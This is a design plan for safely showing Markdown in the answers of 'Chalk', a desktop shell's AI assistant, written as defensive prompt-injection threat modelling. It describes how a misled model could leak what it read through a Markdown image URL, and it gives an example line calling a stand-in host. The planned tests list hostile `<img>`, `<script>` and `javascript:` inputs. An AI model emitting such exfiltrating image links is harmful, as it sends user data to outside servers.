# Plan: Markdown in Chalk's answers

Status: **for later** (2026-11-10), nothing built. It follows the assistant
([assistant.md](assistant.md)), whose first version shows answers as plain text on purpose.
Claims about Qt are marked **checked** (read in this repository) or **assumption** (to check
when building).

## The idea

Chalk's answers are plain text in the first version: one or two sentences, which is all most
requests need. Some answers would read better with a little structure: the steps to do
something by hand, a list of the windows on a workspace, a setting's name in bold, a command in
a code box with a Copy button. This plan adds a small, safe subset of Markdown for those,
without opening the door that plain text keeps shut.

## Why it was plain text

An answer is text written by a model that may have been misled by something it read (a window
title, a notification). Handing that text to Qt's own Markdown or rich text rendering lets the
text decide what Qt does:

- **Images.** `![](https://somewhere/?q=what-it-read)` makes Qt fetch the address, which sends
  whatever is in it to someone else's server without a click. This is the main reason, and it
  would break the "nothing it reads can leave" safeguard in the assistant plan. A `file://`
  address would load a local picture instead. **Assumption** (to confirm, though the plan
  doesn't depend on it): `Text.MarkdownText`, `Text.RichText` and `Text.StyledText` all load
  images named in the text.
- **Links.** A link can show one address and go to another. Nothing in the assistant opens
  URLs, and a clickable link in an answer would be the first thing that does.
- **HTML.** Markdown lets raw HTML through, which brings the same images and links back by
  another route, plus fonts, sizes and colours that could dress an answer up as one of Slate's
  own questions.
- **Size.** A table a thousand columns wide or a list nested fifty deep shouldn't be able to
  make the window misbehave.

Slate does use rich text elsewhere (**checked**: `Text.StyledText` in `NotificationCard.qml` and
`Popouts.qml`, `Text.MarkdownText` once in `SettingsWindow.qml`); each of those is worth a look
with this list in mind, and the one that shows another program's text (notifications) is its
own small review, noted under "Order of work".

## Design

**The rule: the model's text never reaches a text item that interprets it.** Slate reads the
answer itself, understands a short list of things, and draws them with its own items. Anything
it doesn't understand is shown as the characters it is.

### What's understood

| Markdown | Shown as |
|---|---|
| Paragraphs, line breaks | Paragraphs |
| `**bold**`, `*italic*` | Bold, italic |
| `` `code` `` | Monospace, on a faint plate |
| Fenced code blocks | A code box (monospace, no wrapping, scrolls sideways) with **Copy** |
| `-`, `*`, `1.` lists, one level of nesting | Bullets and numbers drawn by Slate |
| `#` headings (any level) | One bold line: answers are small, and big type would shout |

### What isn't, and what happens instead

| Markdown | Shown as |
|---|---|
| Images | The description in brackets, "[image: a chart]". Nothing is fetched, ever |
| Links | The link's words, then the address in dim text. Not clickable. An address can be selected and copied like any text |
| Raw HTML | The characters, as typed: `<img src=…>` appears as exactly that |
| Tables | Kept as their plain rows in monospace (a real table can follow if it's missed) |
| Block quotes, rules, footnotes, task lists, deeper nesting | The plain text, lightly tidied |

### How

- **A parser of Slate's own**, `shell/scripts/safe_markdown.py`: plain Python, standard library,
  like the other scripts. It turns text into a list of blocks:
  `{"type": "paragraph" | "list" | "code" | "heading", …}`, each with runs of
  `{"text": …, "bold": …, "italic": …, "code": …}`. No HTML comes out of it at all. It's a few
  hundred lines because the subset is small, and being Python it gets unit tests against
  hostile input, which is the point of doing it ourselves.
- **The runner sends blocks.** `assistant.py` already turns each agent's stream into Slate's
  own events; it gains `{"type": "blocks", "blocks": […]}`, sent as the answer grows (no more
  than about ten times a second) and once more at the end. The `text` events stay, for the
  notification's first line and for Copy.
- **The window draws them.** `Assistant.qml` shows a `Repeater` over the blocks: a paragraph
  item, a list item, a code box. Each run of text is escaped and wrapped by Slate in the only
  tags it uses (`<b>`, `<i>`, a monospace span) before going to a `Text.StyledText` item, so
  the only markup that item ever sees is Slate's. **Assumption:** escaping `<` and `&` is
  enough to stop `StyledText` reading a tag out of a run; the unit tests and a live test hold
  it to that, and if it isn't, runs become separate `Text.PlainText` items in a `Flow`.
- **While it's still arriving.** A half-written answer has unclosed marks (`**bol`, an open
  code fence). The parser treats an unclosed mark as plain characters and an unclosed fence as
  a code box still being filled, so the text doesn't jump about as it streams.
- **Limits.** The parser stops at 20,000 characters and 200 blocks and says "…" after that;
  the window grows to a set height (about half the screen) and then scrolls.
- **Copy** copies what the model wrote, marks and all. Each code box's Copy copies only its
  code.
- **The briefing changes** (assistant plan, "Setting the scene"): "plain text, no Markdown"
  becomes "keep it short; a simple list, bold or a code block is fine when it helps; no
  links, images or tables". Short answers stay the norm.
- **The notification** when an answer arrives out of sight keeps using the plain first line,
  with the marks stripped.
- **No setting.** It's how answers look, not a choice; a command of your own gets the same
  treatment as any agent, since its output is no more trusted.
- **Game mode, animations.** Nothing new: no effects are added. Any fade as blocks appear goes
  through `Config.ms`.
- **Other distros.** Python's standard library only.

## Tests

- **Unit, `tests/unit/test_safe_markdown.py`**: each understood form; each refused form comes
  out as plain text (an image, an image inside a link, raw `<img>`, `<a href>`, `<script>`,
  `<font>`, an HTML entity, a `javascript:` link); nothing in any output contains a tag the
  parser didn't write; unclosed marks and fences at every cut point of a sample answer (cut it
  at each character, parse, never throw, never lose text); the length and block limits; deep
  nesting and a very wide table don't slow it past a set time.
- **Unit, `tests/unit/test_assistant.py`**: the runner sends `blocks` events, throttled, and a
  final one that matches the full text.
- **Static** (`tests/static/test_consistency.py`): the answer area in `Assistant.qml` never
  uses `Text.MarkdownText` or `Text.RichText`, and no `Image` or `AnimatedImage` in the file
  takes its source from an answer.
- **Live, `tests/live/test_assistant.py`**: feed the window an answer with a list, a code block
  and a hostile image through `test assistant <json>`; `state().assistant` reports the blocks;
  the code box's Copy copies the code; and the container's network log shows no request was
  made (the proof that matters).
- **Visual** (`tests/visual/scenes.py`): `assistant-answer-markdown` (a paragraph, a list, a
  code box), and `assistant-answer-hostile` (the same hostile text, shown as characters).

## Docs and the site

- `site/features.html`: the assistant section says answers can carry lists and code.
- `docs/ASSISTANT.md`: what's understood and what isn't, and why images and links aren't.
- `docs/ARCHITECTURE.md`: `safe_markdown.py` and the `blocks` event.

## Order of work

1. `safe_markdown.py` and its unit tests, on their own. `feat(assistant): read a safe subset
   of Markdown`.
2. The `blocks` event in the runner.
3. The window: blocks drawn, the code box and its Copy; install, reload, try real answers,
   iterate; then live and visual tests. `feat(assistant): show lists, bold and code in
   answers`. The briefing, site and docs with it.
4. Separately, and worth doing even if this plan never is: look at how
   `NotificationCard.qml` shows another program's text with `StyledText`, for the same image
   and link questions. `fix(notifications): …` if it finds anything.

## Open questions

- **Links: text only, or clickable after a question?** Suggested: **text only**. A click that
  opens a browser is a way out for data, and the address is there to copy.
- **Tables.** Suggested: **monospace rows** first; a drawn table if people miss it.
- **Where the parser lives.** Suggested: **Python, in the runner**, for the tests. The
  alternative is JavaScript inside the window, which saves an event type and is harder to
  test against hostile input.
- **Should the server's tool results use it too** (the action list)? Suggested: **no**: those
  rows are Slate's own words already.
